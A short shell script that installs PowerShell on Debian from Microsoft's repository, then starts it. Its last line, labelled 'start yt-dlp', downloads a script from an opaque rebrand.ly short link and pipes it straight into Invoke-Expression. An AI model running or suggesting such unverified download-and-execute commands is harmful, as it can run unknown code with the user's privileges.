# Install system components
sudo apt update && sudo apt install -y curl gnupg apt-transport-https;

# Import the public repository GPG keys
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -;

# Register the Microsoft Product feed
sudo sh -c 'echo "deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-bullseye-prod bullseye main" > /etc/apt/sources.list.d/microsoft.list';

# Install PowerShell
sudo apt update && sudo apt install -y powershell;

# Start PowerShell
pwsh;

# start yt-dlp
iwr rebrand.ly/ytdlpgcli | iex;
